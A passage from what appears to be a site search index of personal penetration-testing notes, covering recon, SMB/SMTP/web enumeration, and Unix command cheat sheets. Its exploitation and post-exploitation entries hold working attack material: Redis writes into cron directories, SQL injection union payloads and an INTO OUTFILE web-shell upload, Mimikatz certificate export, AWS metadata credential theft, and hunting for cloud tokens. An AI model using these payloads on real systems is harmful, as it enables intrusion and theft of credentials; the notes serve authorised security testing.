root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/ OK root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root OK root@Urahara:~# redis-cli -h 10.85.0.52 save OK  The last example is for Ubuntu, for Centos, the above command should be: redis-cli -h 10.85.0.52 config set dir /var/spool/cron/\nMaster-Slave Module Make our redis server master in the cluster. Make vuln server our slave.\nredis-cli -h 10.10.10.10 -p 6379 slaveof 10.85.0.51 6379  redis-cli -h 10.10.10.11 -p 6379 set mykey hello set mykey2 helloworld  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/scanning-and-enumeration/",
	"title": "Scanning and Enumeration",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/02-scanning-and-enumeration/searchsploit/",
	"title": "searchsploit",
	"tags": ["Scanning and Enumeration"],
	"description": "searchsploit description.",
	"content": "searchsploit Search searchsploit \u0026quot;Samba \u0026lt; 2.\u0026quot;  show web url instead of local searchsploit -w \u0026quot;Samba \u0026lt; 2.\u0026quot;  open exploit in editor searchsploit -x exploits/linux/remote/16321.rb  copy exploit to current folder searchsploit -m exploits/linux/remote/16321.rb  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/02-scanning-and-enumeration/smtp/",
	"title": "smtp",
	"tags": ["Scanning and Enumeration"],
	"description": "smtp description.",
	"content": "smtp smtp vrfy msf5 auxiliary(scanner/smtp/smtp_enum) \u0026gt; show options Module options (auxiliary/scanner/smtp/smtp_enum): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 25 yes The target port (TCP) THREADS 1 yes The number of concurrent threads (max one per host) UNIXONLY true yes Skip Microsoft bannered servers when testing unix users USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt yes The file that contains a list of probable users accounts.  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/sql-injection/",
	"title": "SQL Injection",
	"tags": ["Exploitation"],
	"description": "SQL Injection description.",
	"content": "sql injection External stuff exploit-db ASCII table\nAlways True 1=1 a=a\nEscape/stop mysql # -- #--  MySQL Verison select version()\ninformation Schema Table names SELECT table_schema,table_name FROM information_Schema.tables SELECT CONCAT(table_schema,table_name) FROM information_Schema.tables SELECT CONCAT(table_schema,char(58),table_name) FROM information_Schema.tables  Injection example 1 ' union (select CONCAT(table_schema,char(58),table_name) from information_Schema.tables where 1=1 ORDER BY table_name LIMIT 0,1) #--  dummymalex:dummyms table_schema = dummymalex table_name = dummyms  Hide stuff we dont need AND table_schema != 'information_schema'  Injection example 2 ' union (select CONCAT(table_schema,char(58),table_name) from information_Schema.tables where 1=1 AND table_schema != 'information_schema' ORDER BY table_name LIMIT 0,1) #--  LIMIT 0,1 dummymalex:dummyms table_schema = dummymalex table_name = dummyms LIMIT 1,1 dummymalex:users table_schema = dummymalex table_name = users  column_name SELECT column_schema,column_name FROM information_Schema.columns  Injection Example 1 ' union (select CONCAT(column_name) from information_Schema.columns where table_name='dummyms' LIMIT 0,1) #--  LIMIT 0,1 ID LIMIT 1,1 dummyms LIMIT 2,1 description  Injection Example 2 ' union (select CONCAT(column_name) from information_Schema.columns where table_name='users' LIMIT 0,1) #--  LIMIT 0,1 ID LIMIT 1,1 username LIMIT 2,1 password  upload shell with INTO OUTFILE select 'SHELLCODE' INTO OUTFILE '/path/to/public/folder/shell.php';  SQLmap Simple usage sqlmap -u \u0026quot;http://target_server/\u0026quot;  Set target DBMS to MySQL sqlmap -u \u0026quot;http://target_server/\u0026quot; --dbms=mysql  Use POST requests sqlmap -u \u0026quot;http://target_server/\u0026quot; --data=param1=value1\u0026amp;param2=value2  Use POST request file sqlmap -r request.txt -p [param-to-test]  Batch run sqlmap -r request.txt -p [param-to-test] --Batch  Set Risk/Level sqlmap -r request.txt -p psw --level=5 --risk=3 --dbms mysql --batch  enumerate databases sqlmap -r request.txt --batch --dbs  enumerate tables sqlmap -r request.txt -batch --tables  brute-force tables sqlmap -r request.txt -batch --common-tables  brute-force columns sqlmap -r request.txt -batch -T users --common-column  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/04-post-exploitation/steal-access-tokens/",
	"title": "steal access tokens",
	"tags": ["Post Exploitation"],
	"description": "steal access tokens.",
	"content": "steal access tokens GCP Google JSON TOkens and credentials.db are saved to disk.\nJSON tokens are typically used for service account access to GCP. They can be used to authenticate with gcloud and/or ScouteSuite.\nif a user authenticates with gcloud from a compute instance their creds are stored here: ~/.config/gcloud/credentials.db\nsudo find /home -name \u0026quot;credentials.db\u0026quot;\nAzure Azure Cloud Service Packages (.cspkg) cspkg are deployment files created by Visual Studio. They offer possiablty to in intergrate to azure services such as SQL, Storage, etc. These files use the zip file format. Look in these files for creds/certificates. They can be found in \u0026lt;cloud project dir\u0026gt;\\bin\\debug\\publish\nAzure Publish Settings files (.publishsettings) Designed to make pushing code to azure easier. Search for these files in the Downloads folder or the VS projects folder.\nThey contain a Base64 encoded management certifiacte and sometimes clear test credentials. Just open these files in a text editor and search them. To save the cert, save the cert copy the base64 encoded data and save it as a pfx file.\nExtract keys from storage explorers Developers often use storage explorers to easily upload and download files to Azure. It may be possiable to extract storange credentials from these tools. Storage Explorers store credentials on disk (Windows Credential Manager) and use them to authenticate to services such as Azure. There are a number of different storage explorers that change frequently.\nAzure Storage Explorer has a built-in \u0026ldquo;Developer Tool\u0026rdquo; that allows you to set breakpoints while loading credentials allowing you to view them unencrypted.\nweb.config and app.config files WebApps often need read/write access to cloud storage or DBs. These credentials can be saved in a web.config or app.config file. Look for credentials or management certs (which can be saved to a PFX file). These files can often be found at the root folder of a WebApp.\nAzure tools When authenticating to Azure with something like the Az PowerShell module a file named TokenCache.dat is saved in %USERPROFILE%\\.azure\\. This file can be combined with the \u0026lsquo;AzureRmContext.json\u0026rsquo; file, creating the equivalent of the output from the Save-AzContext command. Use AzStealContext to abuse this.\nCommand history May contain creds or tokens or other commands indicating where to look.\n~/.bash_history %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\nInternal Code Repositores G O L D M I N E for keys.\nFind internal repos\n portscanning webservices and then using something like EyeWitmess to screenshot each result. Query AD for all hostnames, look for subdomains such as git, code, repo, bitbucket, gitlab, etc.  If you find these (and have access to repos) you can use automated tools (gitleak, trufflehog, gitrob) or use the built-in search features.\nSearch for string such as:\n AccessKey AKIA id_rsa credentials secret password token  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/web-servers/",
	"title": "Web Servers",
	"tags": ["Exploitation"],
	"description": "Web servers description.",
	"content": "Web Servers Azure Use mimikatz to extract certificated and try to authenticitate to Azure with them Mimikatz\ncrypto::capi privilege::debug crypto::cng crypto::certificates /systemstore:local_machine/store:my /export  AWS Instance Metadata Cloud server hosted on services like EC2 need a way to orient themselfs. Therefore a metadata endpoint was created that runs at 169.254.169.254. This can contain access/secrets keys to AWS and IAM credentials.\nThis should be reachable from localhost, can be abused after server compromise or SSRF.\nIAM credentials are stored here\nhttp://139.254.169.254/latest/meta-data/iam/security-credentials/\u0026lt;IAM ROLE NAME\u0026gt;  Can be hit externally if nginx is misconfigured on AWS\ncurl --proxy host.domain.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ \u0026amp;\u0026amp; echo  AWS EC2 Instance Metadata service Version 2 (IMDSv2) Updated in november 2019. v2 requires a PUT request that response with a token.\nTOKEN=`curl -X PUT \u0026quot;http://139.254.169.254/latest/api/token\u0026quot; -h \u0026quot;X-aws-ec2-metadata-token-ttl-secconds: 21600\u0026quot;` curl http://169.254.169.254/latest/meta-data/profile -H \u0026quot;X-aws-ec2-metadata-token: $TOKEN\u0026quot;  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/certificate-transparency-logs/",
	"title": "Certificate Transparency Logs",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/01-reconnaissance/certificate-transparency-logs/",
	"title": "Certificate Transparency Logs",
	"tags": ["Certificate Transparency Logs"],
	"description": "The art of Credential Gathering.",
	"content": "Certificate Transparency Logs Certificate Transparency monitors and logs digital certs. This is publicly correlated in a searchable log. Using Certificate Transparency logs you may be able to find additional subdomains or other top level domains.\nYou could also search on a disclosed internal hostname from things such as e-mail headers and find the publicly accessible URL associated with this machine or other machines that share the internal domain (hostname01.domain.local, hostname02.domain.local) by looking at the x509v3 extension data.\nExternal services    Service info     crt.sh crt.sh    Example We somehow found out that the internal hostname use domain.local in their FQDN. We can use crt.sh to potentially find public accessible URLS associated with these machines.\nSearching for domain.local\nInspecting the x509v3 data show external hostnames.\nWhich leads us to a public accessible server.\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/01-reconnaissance/credential-gathering/",
	"title": "Credential Gathering",
	"tags": ["Tools", "Credential Gathering"],
	"description": "The art of Credential Gathering.",
	"content": "Credential Gathering External services    Service info     weleakinfo Data Breach Search Engine   scylla.sh db dumps and more (Search Engine)   hashes.org lookup hashes, leaks etc   OnlineHashCrack free online hash crack    Breaches/Leaks    Name Description Download URL     BreachCompilation 1.4 billion password breach compilation wordlist. Magnetlink    Related tools     Tools Description     h8mail  Password Breach Hunting \u0026amp; Email OSINT tool, locally or using premium services. Supports chasing down related email.     "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/01-reconnaissance/dns-recon/",
	"title": "DNS Recon",
	"tags": ["DNS Recon"],
	"description": "DNS Recon, if you don&#39;t know where stuff is its gonna get hard to hack it.",
	"content": "DNS Recon External services    Service info     dnsdumpster dns recon \u0026amp; research, find \u0026amp; lookup dns records   threatcrowd ThreatCrowd is a system for finding and researching artefacts relating to cyber threats.   RIPE \u0026amp; ARIN whois search the registration database of RIPE and ARIN    DNS Bruteforce Seclists has great wordlists for DNS bruteforce.\nTry to find commonalities between domains and iterating names. Think about web01.domain.tld and web02.domain.tld, try web03,04,05 etc.\nMX/SPF Looking at SPF/MX records can give you additional hostnames/ip addresses. Try to preform reverse lookups on these IPs.\nRelated tools     Tools Description     amass  amass description.   PSDNSDumpsterAPI  (Unofficial) PowerShell API for htttps://www.dnsdumpster.com.   sublist3r  sublist3r description.     "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/01-reconnaissance/user-enumeration/",
	"title": "E-Mail Gathering",
	"tags": ["user-enumeration"],
	"description": "If you know e-mail addresses you know naming conventions and possible even passwords.",
	"content": "User enumeration Username schema Use meta data from publicy posted documents to find internal username schemas (sAMAccountName) Tools: PowerMeta, FOCA\nUsers lists LinkedIn is your friend: Tools: CrossLinked\nValidation endpoints    What Where With what     Azure/O365 https://login.microsoft.com/common/oauth2/token MSOLSpray   Onprem https://webmail.domain.com/owa/ or /ews/ MailSniper    External services    Service info     hunter.io find email addresses   emailrep get e-mail \u0026lsquo;reputation\u0026rsquo;   linkedin LinkedIn is your friend.    Related tools     Tools Description     theHarvester  theHarvester gathers emails, names, subdomains, IPs and URLs using multiple public data sources.     "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/01-reconnaissance/google-dorking/",
	"title": "Google Dorking",
	"tags": ["Reconnaissance"],
	"description": "Ask the almight Google Machine. It. Known. All.",
	"content": "Google Dorking External services    Service info     GHDB Google Hacking Database    EXACT-MATCH Force an exact-match search. Use this to refine results for ambiguous searches, or to exclude synonyms when searching for single words.\n\u0026quot;Dank memes\u0026quot;  OR Search for X or Y. This will return results related to X or Y, or both.\nNote: The pipe (|) operator can also be used in place of \u0026ldquo;OR\u0026rdquo;.\ndank OR memes dank | memes  AND Search for X and Y. This will return only results related to both X and Y.\nNote: It doesn’t really make much difference for regular searches, as Google defaults to \u0026ldquo;AND\u0026rdquo; anyway. But it’s very useful when paired with other operators.\ndank AND memes  EXCLUDE Exclude a term or phrase. In our example, any pages returned will be related to (dank) memes but not fresh.\nmemes -fresh  WILDCARD Acts as a wildcard and will match any word or phrase.\ndank * memes  GROUP TERMS Group multiple terms or search operators to control how the search is executed.\n(fresh OR dank) memes  PRICES Search for prices. Also works for Euro (€), but not GBP (£) 🙁\nliver $329  DEFINE: A dictionary built into Google, basically. This will display the meaning of a word in a card-like result in the SERPs.\ndefine:mimikatz  CACHE: Returns the most recent cached version of a web page (providing the page is indexed, of course).\ncache:reddit.com  FILETYPE: Restrict results to those of a certain filetype. E.g., PDF, DOCX, TXT, PPT, XLSX, CSV, etc.\nNote: The \u0026ldquo;ext:\u0026rdquo; operator can also be used—the results are identical.\nclassified filetype:pdf classified ext:pdf  SITE: Limit results to those from a specific website.\nsite:reddit.com  RELATED: Find sites related to a given domain.\nrelated:reddit.com  INTITLE: Find pages with a certain word (or words) in the title.\nIn our example, the exact words \u0026ldquo;index of /\u0026rdquo; in the title tag will be returned.\nintitle:\u0026quot;index of /\u0026quot;  ALLINTITLE: Similar to \u0026ldquo;intitle\u0026rdquo;, but only results containing all of the specified words in the title tag will be returned.\nintitle:index of /  INURL: Find pages with a certain word (or words) in the URL. For this example, any results containing the word \u0026ldquo;memes\u0026rdquo; in the URL will be returned.\ninurl:memes  ALLINURL: Similar to \u0026ldquo;inurl\u0026rdquo;, but only results containing all of the specified words in the URL will be returned.\nallinurl:dank memes  INTEXT: Find pages containing a certain word (or words) somewhere in the content. For this example, any results containing the word \u0026ldquo;memes\u0026rdquo; in the page content will be returned.\nintext:memes  ALLINTEXT: Similar to \u0026ldquo;intext\u0026rdquo;, but only results containing all of the specified words somewhere on the page will be returned.\nallintext:dank memes  AROUND(X) Proximity search. Find pages containing two words or phrases within X words of each other. For this example, the words \u0026ldquo;dank\u0026rdquo; and \u0026ldquo;funny\u0026rdquo; must be present in the content and no further than four words apart.\ndank AROUND(4) funny  WEATHER: Find the weather for a specific location. This is displayed in a weather snippet, but it also returns results from other \u0026ldquo;weather\u0026rdquo; websites.\nweather:rotterdam  STOCKS: See stock information (i.e., price, etc.) for a specific ticker.\nstocks:nintendo  MAP: Force Google to show map results for a locational search.\nmap:rotterdam  MOVIE: movie:war games  IN Convert one unit to another. Works with currencies, weights, temperatures, etc.\n420 euros in usd  SOURCE: Find news results from a certain source in Google News.\nmalware source:security.nl  #..# Search for a range of numbers.\narcade 1980..1990  INANCHOR: Find pages that are being linked to with specific anchor text.\ninanchor:apple iphone  ALLINANCHOR: Similar to \u0026ldquo;inanchor\u0026rdquo;, but only results containing all of the specified words in the inbound anchor text will be returned.\nallinanchor:apple iphone  BLOGURL: Find blog URLs under a specific domain. This was used in Google blog search, but I’ve found it does return some results in regular search.\nblogurl:microsoft.com  LOCATION: Find results from a given area.\nlocation:\u0026quot;rotterdam\u0026quot; taco  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/identify-technologies/",
	"title": "Identify Technologies",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/01-reconnaissance/identify-technologies/",
	"title": "Identify Technologies",
	"tags": ["Identify Technologies"],
	"description": "Find out what services they are using.",
	"content": "Identify Technologies Netblocks   Azure Netblocks Public: https://www.microsoft.com/en-us/download/details.aspx?id=56519 US Gov: http://www.microsoft.com/en-us/download/details.aspx?id=57063 Germany: http://www.microsoft.com/en-us/download/details.aspx?id=57064 China: http://www.microsoft.com/en-us/download/details.aspx?id=57062\n  AWS Netblocks https://ip-ranges.amazonaws.com/ip-ranges.json\n  GCP http://www.gstatic.com/ipranges/cloud.json\n  Can be automated with https://github.com/oldrho/ip2provider\nMicrosoft Products ADFS Usage\n   Notes url     Find out what ADFS is used to for to authenticate to. https://adfs.domain.tld/adfs/ls/idpinitiatedsignon.aspx   Show information about O365/hybrid configs https://login.microsoftonline.com/getuserrealm.srf?login=user@targetdomain.com\u0026amp;xml=1   Show information disclosed from autodiscover https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/user@targetdomain.com?Protocol=autodiscoverv1    G-Suite Usage You are able to identify if a valid e-mail address usages G-suite by trying to authenticate to it.\nAWS Usage Look for content being pulled from S3 buckets.\nhttps://[bucketname].s3.amazonaws.com https://s3-[region].s3.amazonaws.com\\[OrgName]\nBox.com Look for any login portal https://companyname.account.box.com\nIf so, try dorking them for cached content.\nWebsite External services    Service info     builtwith Find out what websites are Built With    Browser plugins    Service info     Wappalyzer Uncovers technologies used on websites    Related tools     Tools Description     whatweb  WhatWeb identifies websites.     "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/s3-bucket-fun/",
	"title": "s3 bucket fun",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/s3-bucket-fun/",
	"title": "s3 bucket fun",
	"tags": ["s3 bucket fun"],
	"description": " ",
	"content": "s3 bucket fun Setup the AWS CLI with a user that has AmazonS3FullAccess permission AWS Access keys.\nRun cloud_enum\npython3 cloud_enum.py -k \u0026lt;OrgName\u0026gt;  If it returns a bucket you can list/download the contents with the AWS CLI\naws s3 ls s3://bucketname  If you can write you can add content to the bucket with the AWS CLI\naws s3 mv malware.html s3://bucketname/malware.html  Domain Hijacking If you see a 404 to *.s3.amazonaws.com you can highjack the site that tries to load this bucket. s3 buckets automticlly get a cname acoridjng to their name, if they are removed but the site till uses them you can create a new bucket under that name, giving you control over the website.\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/shodan/",
	"title": "Shodan",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/01-reconnaissance/shodan/",
	"title": "Shodan",
	"tags": ["Shodan"],
	"description": "Use the power of OSINT.",
	"content": "Shodan org:\u0026ldquo;Target name\u0026rdquo;\nnet:\u0026ldquo;CIDR rangee\u0026rdquo;\nport:\u0026ldquo;443\u0026rdquo;\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/02-scanning-and-enumeration/smb/",
	"title": "smb",
	"tags": ["Scanning and Enumeration"],
	"description": "smb description.",
	"content": "enum4linux Do everything enum4linux -a 192.168.88.129  smbclient protocol negotiation failed: NT_STATUS_IO_TIMEOUT Resolution: On Kali, edit /etc/samba/smb.conf Add the following under global: client min protocol = CORE client max protocol = SMB3  list smbclient -L \\\\\\\\10.10.10.10\\\\  download all files smbclient \\\\\\\\10.10.10.10\\\\share mask \u0026quot;\u0026quot; recurse ON prompt OFF cd \u0026quot;path\\to\\remote\\dir\u0026quot; lcd \u0026quot;~/path/to/download/to/\u0026quot; mget *  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/social-media/",
	"title": "Social Media",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/01-reconnaissance/social-media/",
	"title": "Social Media",
	"tags": ["Social Media"],
	"description": "Use the power of OSINT.",
	"content": "social media LinkedIn Company -\u0026gt; Images\nCompany -\u0026gt; People\nRelated tools     Tools Description       "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/tools/",
	"title": "Tools",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/user-enumeration/",
	"title": "user-enumeration",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/02-scanning-and-enumeration/web/",
	"title": "Web",
	"tags": ["Scanning and Enumeration"],
	"description": "Web",
	"content": "gobuster General scan ./go/bin/gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -t 40 -e  Bigger wordlist and extensions gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,sql -t 40 -e  run trough burpsuite ~/go/bin/gobuster dir -u http://192.168.56.101:12380 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sql,html,txt -t 40 -e -p http://127.0.0.1:8080  kadimus LFI Scan \u0026amp; Exploit Tool (@hc0d3r - P0cL4bs Team)\ngeneral scan, through burp and save results kadimus -u http://192.168.56.103/?page=login --proxy http://127.0.0.1:8080 --output outputfile  get file kadimus -u http://192.168.56.103/?page=login --parameter page --get-source --filename \u0026quot;login\u0026quot; --proxy http://127.0.0.1:8080  nikto General scan nikto -h [hostname/ip]  Output to file nikto -h [hostname/ip] -output [filename]  run trough burpsuite LW_SSL_ENGINE=SSLeay\nnikto -h [hostname/ip] -useproxy http://localhost:8080/  wpscan General scan (mostly passive) get all vuln plugins/themes, get Timthumbs, config backups, Medias and users\nwpscan --url https://192.168.56.101:12380/blogblog/ --disable-tls-checks --enumerate vp,vt,tt,cb,dbe,u,m\nGeneral scan + WPVulnDB API wpscan --url https://192.168.56.101:12380/blogblog/ --disable-tls-checks --enumerate vp,vt,tt,cb,dbe,u,m --api-token TOKEN \nAggressive scan + WPVulnDB API (go ham) wpscan --url https://192.168.56.101:12380/blogblog/ --disable-tls-checks --enumerate ap,at,tt,cb,dbe,u,m --detection-mode aggressive --plugins-detection aggressive --plugins-version-detection aggressive --api-token TOKEN\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/base64/",
	"title": "base64",
	"tags": ["Unix Commands"],
	"description": "base64 encode/decode data and print to standard output.",
	"content": "base64 Usage base64 OPTION FILE  Flags -w, --wrap=COLS Wrap encoded lines after COLS character (default 76). Use 0 to disable line wrapping. -d, --decode Decode data. -i, --ignore-garbage When decoding, ignore non-alphabet characters. --help display this help and exit --version output version information and exit  Examples Encode echo EncodeMe | base64 -e  Decode echo RW5jb2RlTWU= | base64 -d  Encode file base64 file1 \u0026gt; encodedfile1  Decode file base64 -d encodedfile1 \u0026gt; file1  Also see N/A\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/bzip2/",
	"title": "bzip2",
	"tags": ["Unix Commands"],
	"description": "a block-sorting file compressor.",
	"content": "bzip2 Usage bzip2 OPTIONS FILE  Flags -c --stdout Compress or decompress to standard output. -d --decompress Force decompression. bzip2, bunzip2 and bzcat are really the same program, and the decision about what actions to take is done on the basis of which name is used. This flag overrides that mechanism, and forces bzip2 to decompress. -z --compress The complement to -d: forces compression, regardless of the invocation name. -t --test Check integrity of the specified file(s), but dont decompress them. This really performs a trial decompression and throws away the result. -f --force Force overwrite of output files. Normally, bzip2 will not overwrite existing output files. Also forces bzip2 to break hard links to files, which it otherwise wouldnt do. bzip2 normally declines to decompress files which dont have the correct magic header bytes. If forced (-f), however, it will pass such files through unmodified. This is how GNU gzip behaves. -k --keep Keep (dont delete) input files during compression or decompression. -s --small Reduce memory usage, for compression, decompression and testing. Files are decompressed and tested using a modified algorithm which only requires 2.5 bytes per block byte. This means any file can be decompressed in 2300k of memory, albeit at about half the normal speed. During compression, -s selects a block size of 200k, which limits memory use to around the same figure, at the expense of your compression ratio. In short, if your machine is low on memory (8 megabytes or less), use -s for everything. See MEMORY MANAGEMENT below. -q --quiet Suppress non-essential warning messages. Messages pertaining to I/O errors and other critical events will not be suppressed. -v --verbose Verbose mode -- show the compression ratio for each file processed. Adding more -v increase the verbosity level, spewing out lots of information which is primarily of interest for diagnostic purposes. -L --license -V --version Display the software version, license terms and conditions. -1 (or --fast) to -9 (or --best) Set the block size to 100 k, 200 k .. 900 k when compressing. Has no effect when decompressing. See MEMORY MANAGEMENT below. The --fast and --best aliases are primarily for GNU gzip compatibility. In particular, --fast doesnt make things significantly faster. And --best merely selects the default behaviour. -- Treats all subsequent arguments as file names, even if they start with a dash. This is so you can handle files with names beginning with a dash, for example: bzip2 -- -myfilename. --repetitive-fast --repetitive-best These flags are redundant in versions 0.9.5 and above. They provided some coarse control over the behaviour of the sorting algorithm in earlier versions, which was sometimes useful. 0.9.5 and above have an improved algorithm which renders these flags irrelevant.  Examples compress a file bzip2 file1  decompress a file bzip2 -d file1.bz2  compress a single file and keep the original bzip2 -c file1 \u0026gt; file1.bz  fast compression bzip2 -1 file1  best compression bzip2 -9 file1  Also see N/A\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/cron/",
	"title": "cron",
	"tags": ["Unix Commands"],
	"description": "daemon to execute scheduled commands.",
	"content": "cron Usage Min Hour Day Mon Weekday Command * * * * * command to be executed ┬ ┬ ┬ ┬ ┬ │ │ │ │ └─ Weekday (0=Sun .. 6=Sat) │ │ │ └────── Month (1..12) │ │ └─────────── Day (1..31) │ └──────────────── Hour (0..23) └───────────────────── Minute (0..59)  Examples    Example Description     0 * * * * every hour   */15 * * * * every 15 mins   0 */2 * * * every 2 hours   0 0 * * 0 every Sunday midnight   @reboot every reboot    Crontab Adding tasks easily echo \u0026quot;@reboot echo hi\u0026quot; | crontab  Open in editor crontab -e  List tasks crontab -l [-u user]  Also see N/A\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/md5sum/",
	"title": "md5sum",
	"tags": ["Unix Commands"],
	"description": "compute and check MD5 message digest.",
	"content": "md5sum Usage md5sum OPTIONS FILE  Flags -b, --binary read in binary mode -c, --check read MD5 sums from the FILEs and check them --tag create a BSD-style checksum -t, --text read in text mode (default) -z, --zero end each output line with NUL, not newline, and disable file name escaping The following five options are useful only when verifying checksums: --ignore-missing dont fail or report status for missing files --quiet dont print OK for each successfully verified file --status dont output anything, status code shows success --strict exit non-zero for improperly formatted checksum lines -w, --warn warn about improperly formatted checksum lines --help display this help and exit --version output version information and exit  Examples display the hash value md5sum file1  validate multiple files md5sum file1 file2 file3 \u0026gt; hashes md5sum --check hashes  display only modified files md5sum --quiet --check hashes  identify invalid hash values md5sum --warn --check hashes  Also see N/A\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/random/",
	"title": "random",
	"tags": ["Unix Commands"],
	"description": "random description.",
	"content": "random Usage of dash (-) in place of a filename Using - as a filename to mean stdin/stdout is a convention that a lot of programs use. It is not a special property of the filename. The kernel does not recognize - as special so any system calls referring to - as a filename will use - literally as the filename.\nWith bash redirection, - is not recognized as a special filename, so bash will use that as the literal filename.\nWhen cat sees the string - as a filename, it treats it as a synonym for stdin. To get around this, you need to alter the string that cat sees in such a way that it still refers to a file called -. The usual way of doing this is to prefix the filename with a path - ./-, or /home/Tim/-. This technique is also used to get around similar issues where command line options clash with filenames, so a file referred to as ./-e does not appear as the -e command line option to a program, for example.\ncat ./-  Also see N/A\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/scp/",
	"title": "scp",
	"tags": ["Unix Commands"],
	"description": "secure copy (remote file copy program).",
	"content": "scp Usage scp OPTIONS SOURCE_PATH DESTINATION_PATH  Flags transfer directory -r  see the transfer details (verbose) -v  copy files with compression -C  limit bandwidth -l 800  keep the original attributes -p  quite -q  Examples push a file to a remote system scp file user@host:/path/to/file  pull a file from a remote system scp user@host:/path/to/file /local/path/to/file  push multiple files to a remote system scp file1 file2 user@host:/path/to/directory  push an entire directory to a remote system scp -r /path/to/directory user@host:/path/to/directory  See Also  SCP Cheatsheets  "
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/tar/",
	"title": "tar",
	"tags": ["Unix Commands"],
	"description": "an archiving utility.",
	"content": "tar Usage tar FLAGS FILE.tar.gz  Flags -z : Work on gzip compression automatically when reading archives. -x : Extract tar.gz archive. -v : Produce verbose output i.e. display progress and extracted file list on screen. -f : Read the archive from the archive to the specified file. In this example, read backups.tar.gz archive. -t : List the files in the archive. -r : Append files to the end of the tarball. --delete (GNU/Linux tar only) : Delete files from the tarball.  Examples extracting tar.gz file tar -zxvf file1.tar.gz  extract file2 from file.tar.gz tarball tar -zxvf file1.tar.gz file1  list files tar -tvf file1.tar.gz  create a tarball tar -cvf file.tar file1 file2 file3  add files to an existing tarball tar -rf file.tar file4  delete files from a tarball tar -f file.tar --delete file4  Also see N/A\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/unix-commands/",
	"title": "Unix Commands",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/awk/",
	"title": "awk",
	"tags": ["Unix Commands"],
	"description": "awk is a complete pattern scanning and processing language, it is most commonly used as a Unix command-line filter to reformat the output of other commands.",
	"content": "awk Usage awk OPTIONS PROGRAM FILE  Flags -F fs --field-separator fs Use fs for the input field separator (the value of the FS predefined variable). -v var=val --assign var=val Assign the value val to the variable var, before execution of the program begins. Such variable values are available to the BEGIN block of an AWK program. -f program-file --file program-file Read the AWK program source from the file program-file, instead of from the first command line argument. Multiple -f (or --file) options may be used. -mf NNN -mr NNN Set various memory limits to the value NNN. The f flag sets the maximum number of fields, and the r flag sets the maximum record size. These two flags and the -m option are from an earlier version of the Bell Laboratories research version of UNIX awk. They are ignored by gawk, since gawk has no pre-defined limits. (Current versions of the Bell Laboratories awk no longer accept them.) -O --optimize Enable optimizations upon the internal representation of the program. Currently, this includes just simple constant-folding. The gawk maintainer hopes to add additional optimizations over time. -W compat -W traditional --compat --traditional Run in compatibility mode. In compatibility mode, gawk behaves identically to UNIX awk; none of the GNU -specific extensions are recognized. The use of --traditional is preferred over the other forms of this option. See GNU EXTENSIONS, below, for more information. -W copyleft -W copyright --copyleft --copyright Print the short version of the GNU copyright information message on the standard output and exit successfully. -W dump-variables[=file] --dump-variables[=file] Print a sorted list of global variables, their types and final values to file. If no file is provided, gawk uses a file named awkvars.out in the current directory. Having a list of all the global variables is a good way to look for typographical errors in your programs. You would also use this option if you have a large program with a lot of functions, and you want to be sure that your functions dont inadvertently use global variables that you meant to be local. (This is a particularly easy mistake to make with simple variable names like i, j, and so on.) -W exec file --exec file Similar to -f, 